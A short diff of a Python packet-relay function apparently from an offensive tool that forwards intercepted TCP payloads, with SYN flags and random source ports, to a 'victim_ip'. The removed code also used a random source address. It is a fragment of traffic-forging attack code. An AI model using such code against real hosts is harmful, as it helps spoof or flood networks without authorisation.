@@ -236,15 +236,15 @@ def packet_received(packet):
 				#packet[IP].dst = victim_ip
 
 				try:
-					custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
-					if custom is not None:
-						rand_socket.send(custom.to_bytes())
-						
-					"""ip = IP(src = rand_ip, dst = victim_ip)
+					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
+					#if custom is not None:
+					#	rand_socket.send(custom.to_bytes())
+
+					ip = IP(dst = victim_ip)
 					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
 					new_packet = ip/tcp/packet[TCP].payload
+					rand_socket.send(bytes(new_packet))
 
-					rand_socket.send(bytes(new_packet))"""
 				except Exception as e:
 					print('Relaying message FAILED')
 					print(e)
